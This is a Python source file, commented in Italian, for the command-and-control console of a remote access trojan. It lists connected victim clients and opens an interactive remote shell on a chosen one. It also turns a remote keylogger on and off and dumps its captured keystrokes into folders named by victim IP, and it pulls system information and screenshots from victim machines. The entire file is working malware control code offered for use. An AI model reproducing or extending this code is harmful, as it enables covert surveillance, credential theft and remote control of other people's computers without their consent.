import os
import sys
import logging
from datetime import datetime

import pull
import subprocess
import tabulate


class COMMCENTER:
    CLIENTS = []  # Lista globale di sessioni client: [(ID, oggetto CLIENT), ...]
    COUNTER = 0  # Contatore incrementale per assegnare ID univoci ai client
    CURRENT = ()  # Sessione corrente selezionata: tupla (ID, CLIENT) oppure vuota se nessuno
    KEYLOGS = []  # Placeholder per eventuali keylog

    # funzione comando help inserito dall'utente
    def c_help(self, vals):
        if len(vals) > 1:
            cmd = vals[1]
            if cmd == "sessions":
                pull.help_c_sessions()
            elif cmd == "connect":
                pull.help_c_connect()
            elif cmd == "disconnect":
                pull.help_c_disconnect()
            elif cmd == "clear":
                pull.help_c_clear()
            elif cmd == "shell":
                pull.help_c_shell()
            elif cmd == "keylogger":
                pull.help_c_keylogger()
            elif cmd == "sysinfo":
                pull.help_c_sysinfo()
            elif cmd == "screenshot":
                pull.help_c_screenshot()
        else:
            if self.CURRENT:
                pull.help_c_current()
            else:
                pull.help_c_general()

    def get_valid(self, _id):
        """Trova un client valido dato l'ID"""
        for client in self.CLIENTS:
            if client[0] == int(_id):
                return client
        return False

    def check_connection(self):
        """
        Verifica che ci sia un client connesso e attivo.
        Restituisce True se OK, False altrimenti.
        """
        if not self.CURRENT:
            sys.stdout.write("\n")
            pull.error("You need to connect before execute this command!")
            sys.stdout.write("\n")
            return False

        if not self.CURRENT[1].is_connected():
            sys.stdout.write("\n")
            pull.error("Client is disconnected!")
            sys.stdout.write("\n")
            # Rimuovi il client dalla sessione corrente
            self.CURRENT = ()
            return False

        return True

    def c_connect(self, args):
        if len(args) == 2:
            tgt = self.get_valid(args[1])
            if tgt:
                # Verifica che il client sia ancora connesso
                if tgt[1].is_connected():
                    self.CURRENT = tgt
                    sys.stdout.write("\n")
                    pull.print(f"Connected to client {tgt[0]} [{tgt[1].ip}:{tgt[1].port}]")
                    sys.stdout.write("\n")
                else:
                    sys.stdout.write("\n")
                    pull.error("That client is disconnected!")
                    sys.stdout.write("\n")
            else:
                sys.stdout.write("\n")
                pull.error("No client is associated with that ID!")
                sys.stdout.write("\n")
        else:
            sys.stdout.write("\n")
            pull.error("Invalid Syntax!")
            sys.stdout.write("\n")

    def c_disconnect(self):
        if self.CURRENT:
            sys.stdout.write("\n")
            pull.print("Disconnected from current session")
            sys.stdout.write("\n")
        self.CURRENT = ()

    def c_sessions(self):
        headers = (
            pull.BOLD + 'ID' + pull.END,
            pull.BOLD + 'IP Address' + pull.END,
            pull.BOLD + 'Incoming Port' + pull.END,
            pull.BOLD + 'Status' + pull.END
        )

        lister = []

        for client in self.CLIENTS:
            status_color = pull.GREEN if client[1].STATUS == "Active" else pull.RED
            row = [
                pull.RED + str(client[0]) + pull.END,
                pull.DARKCYAN + client[1].ip + pull.END,
                pull.BLUE + str(client[1].port) + pull.END,
                status_color + client[1].STATUS + pull.END,
            ]
            lister.append(row)

        sys.stdout.write("\n")
        if lister:
            print(tabulate.tabulate(lister, headers=headers))
        else:
            pull.print("No active sessions")
        sys.stdout.write("\n")

    def c_shell(self):
        """Esegue comandi shell sul client remoto"""
        if not self.check_connection():
            return

        sys.stdout.write("\n")
        pull.print("Type 'exit' to quit shell mode")
        sys.stdout.write("\n")

        while True:
            try:
                val = input("# ").strip()

                if not val:
                    continue

                if val == "exit":
                    break

                # Verifica connessione prima di inviare
                if not self.CURRENT[1].is_connected():
                    pull.error("Client disconnected!")
                    self.CURRENT = ()
                    break

                # Invia comando
                self.CURRENT[1].send_data(f"shell:{val}")

                # Ricevi risposta con timeout
                result = self.CURRENT[1].recv_data(timeout=30)

                if result is None:
                    pull.error("No response from client (timeout or disconnected)")
                    self.CURRENT = ()
                    break

                # Stampa risultato
                result = result.strip()
                if result:
                    print(result)

            except KeyboardInterrupt:
                sys.stdout.write("\n")
                pull.print("Shell interrupted")
                break
            except Exception as e:
                pull.error(f"Error: {e}")
                logging.error(f"c_shell error: {e}", exc_info=True)
                break

    def c_clear(self):
        """Pulisce lo schermo"""
        if os.name == "nt":
            subprocess.call("cls", shell=True)
        else:
            subprocess.call("clear", shell=True)

    def c_keylogger(self, args):
        """Gestisce il keylogger sul client remoto"""
        if not self.check_connection():
            return

        if len(args) != 2:
            sys.stdout.write("\n")
            pull.error("Invalid Syntax! Use: keylogger [on|off|dump|status]")
            sys.stdout.write("\n")
            return

        action = args[1]

        try:
            if action == "status":
                self.CURRENT[1].send_data("keylogger:status")
                result = self.CURRENT[1].recv_data(timeout=10)

                if result is None:
                    pull.error("No response from client")
                    return

                sys.stdout.write("\n")
                print(result.strip() if result.strip() else "[No status available]")
                sys.stdout.write("\n")

            elif action == "on":
                self.CURRENT[1].send_data("keylogger:on")
                result = self.CURRENT[1].recv_data(timeout=10)

                if result is None:
                    pull.error("No response from client")
                    return

                sys.stdout.write("\n")
                print(result.strip() if result.strip() else "[Keylogger started]")
                sys.stdout.write("\n")

            elif action == "off":
                self.CURRENT[1].send_data("keylogger:off")
                result = self.CURRENT[1].recv_data(timeout=10)

                if result is None:
                    pull.error("No response from client")
                    return

                sys.stdout.write("\n")
                print(result.strip() if result.strip() else "[Keylogger stopped]")
                sys.stdout.write("\n")

            elif action == "dump":
                sys.stdout.write("\n")
                pull.print("Requesting keylog dump...")

                self.CURRENT[1].send_data("keylogger:dump")
                result = self.CURRENT[1].recv_data(timeout=30)

                if result is None:
                    pull.error("No response from client")
                    return

                # Crea directory per i keylogs
                dirname = os.path.dirname(__file__)
                dirname = os.path.join(dirname, 'keylogs')
                if not os.path.isdir(dirname):
                    os.mkdir(dirname)

                dirname = os.path.join(dirname, '%s' % (self.CURRENT[1].ip))
                if not os.path.isdir(dirname):
                    os.mkdir(dirname)

                fullpath = os.path.join(
                    dirname,
                    datetime.now().strftime("%d-%m-%Y %H-%M-%S.txt")
                )

                with open(fullpath, 'w', encoding="utf-8", errors="ignore") as fl:
                    fl.write(result)

                pull.print("Dumped: [" + pull.GREEN + fullpath + pull.END + "]")
                sys.stdout.write("\n")

            else:
                sys.stdout.write("\n")
                pull.error("Invalid action! Use: on, off, dump, or status")
                sys.stdout.write("\n")

        except Exception as e:
            pull.error(f"Keylogger error: {e}")
            logging.error(f"c_keylogger error: {e}", exc_info=True)

    def c_sysinfo(self):
        """Ottiene informazioni di sistema dal client"""
        if not self.check_connection():
            return

        try:
            sys.stdout.write("\n")
            pull.print("Requesting system information...")

            self.CURRENT[1].send_data("sysinfo:")
            result = self.CURRENT[1].recv_data(timeout=15)

            if result is None:
                pull.error("No response from client (timeout or disconnected)")
                self.CURRENT = ()
                return

            result = result.strip()
            if result:
                print(result)
            else:
                pull.print("[No system information available]")

            sys.stdout.write("\n")

        except Exception as e:
            pull.error(f"Sysinfo error: {e}")
            logging.error(f"c_sysinfo error: {e}", exc_info=True)

    def c_screenshot(self):
        """Cattura uno screenshot dal client"""
        if not self.check_connection():
            return

        try:
            sys.stdout.write("\n")
            pull.print("Requesting screenshot (this may take a moment)...")

            self.CURRENT[1].send_data("screenshot:")
            result = self.CURRENT[1].recv_data(timeout=60)  # Timeout più lungo per screenshot

            if result is None:
                pull.error("No response from client (timeout or disconnected)")
                self.CURRENT = ()
                return

            # Se result è una stringa (messaggio di errore), mostrala
            if isinstance(result, str):
                pull.error(f"Client error: {result}")
                return

            # Altrimenti sono bytes (l'immagine)
            if not isinstance(result, bytes):
                result = result.encode('latin-1')  # Fallback encoding

            # Crea directory per gli screenshot
            dirname = os.path.dirname(__file__)
            dirname = os.path.join(dirname, 'screenshots')
            if not os.path.isdir(dirname):
                os.mkdir(dirname)

            dirname = os.path.join(dirname, '%s' % (self.CURRENT[1].ip))
            if not os.path.isdir(dirname):
                os.mkdir(dirname)

            fullpath = os.path.join(
                dirname,
                datetime.now().strftime("%d-%m-%Y %H-%M-%S.png")
            )

            with open(fullpath, 'wb') as fl:
                fl.write(result)

            pull.print("Saved: [" + pull.DARKCYAN + fullpath + pull.END + "]")
            sys.stdout.write("\n")

        except Exception as e:
            pull.error(f"Screenshot error: {e}")
            logging.error(f"c_screenshot error: {e}", exc_info=True)

    def c_exit(self):
        """Esce dal programma"""
        sys.stdout.write("\n")

        # Chiudi tutte le connessioni aperte
        for client in self.CLIENTS:
            try:
                client[1].close()
            except:
                pass

        pull.exit("See Ya!\n")